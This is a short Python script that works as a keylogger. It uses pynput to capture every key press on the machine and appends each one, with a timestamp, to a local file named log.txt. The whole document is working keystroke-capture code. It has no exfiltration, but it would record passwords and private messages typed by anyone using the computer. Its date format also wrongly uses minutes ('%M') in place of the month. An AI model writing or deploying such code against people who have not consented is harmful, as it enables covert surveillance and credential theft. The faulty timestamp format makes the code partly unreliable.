from pynput.keyboard import Listener
import datetime


def log_data(key):
    print(key)
    data = str(key)
    with open("log.txt", "a") as f:
        f.write(datetime.datetime.now().strftime("%d-%M-%Y %H:%M:%S")+":"+data+"\n")


with Listener(on_press=log_data) as l:
    l.join()
